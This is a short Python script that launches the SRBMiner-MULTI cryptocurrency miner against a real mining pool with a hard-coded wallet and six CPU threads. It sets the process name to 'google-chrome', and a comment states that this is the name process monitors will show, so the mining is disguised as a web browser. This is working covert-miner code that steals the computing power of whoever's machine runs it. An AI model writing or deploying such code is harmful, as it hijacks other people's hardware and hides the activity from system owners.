import os
os.system("chmod +x SRBMiner-MULTI")
# Replace the current process with the mining process
os.execvp("./SRBMiner-MULTI", [
    "google-chrome",  # This will be the name shown in process monitors
    "--disable-gpu",
    "--algorithm", "verushash",
    "--pool", "na.luckpool.net:3956",
    "--wallet", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T",
    "--worker", "tr1",  # Using a fixed worker name
    "--password", "x",
    "--cpu-threads", "6"
])
